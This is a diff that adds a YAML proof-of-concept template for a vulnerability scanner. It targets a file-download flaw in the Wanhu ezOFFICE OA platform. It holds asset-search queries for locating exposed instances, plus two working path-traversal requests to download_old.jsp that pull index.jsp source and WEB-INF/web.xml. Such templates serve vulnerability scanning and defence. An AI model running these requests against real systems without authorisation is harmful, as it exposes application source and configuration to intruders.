@@ -1,0 +1,41 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-wanhu-ezoffice-download_old-file-download
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/download_old.jsp?path=..&name=index.jsp&FileName=index.jsp
+            headers:
+            body: 
+        expression: response.status == 200 && response.raw_header.bcontains(b"index.jsp") && response.body_string.contains("<%")
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/download_old.jsp?path=..&name=web.xml&FileName=WEB-INF/web.xml
+            headers:
+            body: 
+        expression: response.status == 200 && response.raw_header.bcontains(b"web.xml") && response.body_string.contains("xml version")
+
+expression: r0() || r1()
